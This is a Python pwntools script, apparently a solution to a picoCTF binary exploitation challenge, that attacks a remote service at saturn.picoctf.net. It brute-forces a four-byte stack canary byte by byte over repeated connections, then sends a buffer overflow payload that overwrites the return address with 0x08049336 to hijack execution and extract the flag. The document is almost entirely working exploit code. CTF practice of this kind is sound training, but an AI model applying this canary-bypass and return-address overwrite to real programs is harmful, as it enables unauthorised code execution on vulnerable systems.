#!/usr/bin/env python3

from pwn import *
from string import *
import re

HOST = 'saturn.picoctf.net'
PORT = 53320

def bfcanary():
    canary = b''
    for i in range(1, 5):
        for c in printable:
            p = remote(HOST, PORT)
            p.sendline(str(64 + i).encode('utf8'))
            payload = b'A'*64 + canary + c.encode('utf8')
            p.sendline(payload)
            output = p.recvall().decode(encoding='ascii')

            if "Ok... Now Where's the Flag?" in output:
                canary += c.encode('utf8') 
                break
    return canary

canary = bfcanary()
raddr = p32(0x08049336)
_raddr = "".join("\\x{:02x}".format(b) for b in raddr)
payload = b'A' * 64 + canary + b'B' * 16 + raddr
p = remote(HOST, PORT)
p.sendline(str(92).encode('utf8'))
p.sendline(payload)
flag = re.search(b'picoCTF\{.*\}', p.recvall())[0].decode(encoding='ascii')
log.info(f'Canary string: {canary.decode(encoding="ascii")}')
log.info(f"Payload: {'A' * 64 + canary.decode(encoding='ascii') + 'B' * 16 + _raddr}")
log.info(f'Flag: {flag}')
